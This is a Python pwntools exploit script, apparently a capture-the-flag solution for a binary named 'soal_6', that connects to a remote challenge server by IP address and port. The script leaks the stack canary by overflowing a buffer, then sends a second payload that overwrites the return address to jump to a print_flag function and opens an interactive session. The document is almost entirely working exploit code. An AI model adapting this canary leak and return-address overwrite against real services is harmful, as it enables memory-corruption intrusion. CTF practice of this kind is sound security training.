from pwn import *

HOST = "103.185.44.235"
PORT = 11206
# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Find offset to EIP/RIP for buffer overflows
def find_ip(payload):
    # Launch process and send payload
    p = process(exe, level="warn")
    p.sendlineafter(b">", payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn("located EIP/RIP offset at {a}".format(a=ip_offset))
    return ip_offset


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *0x00000000004011d3
b *0x0000000000401242
""".format(
    **locals()
)

# Binary filename
exe = "./soal_6"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
libc = ELF("./libc6_2.31-0ubuntu9.9_amd64.so")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
# offset = find_ip(cyclic(500))
offset = 120
# Start program
io = start()

# Build the payload
# payload = flat({
#     offset: [
#         win
#     ]
# })

# soal 5
payload = cyclic(120) + b"|"
print_flag = 0x004011B2

# Send the payload
io.recv(15)
io.send(payload)
io.recvuntil(b"|", drop=True)
canary = io.recv(7)
# canary = u64(b"\x00" + canary)
canary = u64(canary.rjust(8, b"\x00"))

new_payload = cyclic(72) + p64(canary) + cyclic(8) + p64(print_flag)

io.recv()
io.send(new_payload)

# Got Shell?
io.interactive()


# p = process("./soal_3")
# p = remote("103.185.44.235", 11203)"
